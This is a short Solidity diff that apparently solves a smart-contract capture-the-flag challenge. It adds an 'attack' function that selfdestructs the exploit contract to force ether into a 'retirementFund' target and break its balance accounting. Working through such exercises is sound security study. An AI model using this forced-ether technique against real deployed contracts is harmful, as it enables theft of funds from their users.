@@ -58,4 +58,9 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+    function attack() public{
+        require(address(this).balance == 1 ether);
+        selfdestruct(payable(address(retirementFund)));
+    }
+
 }
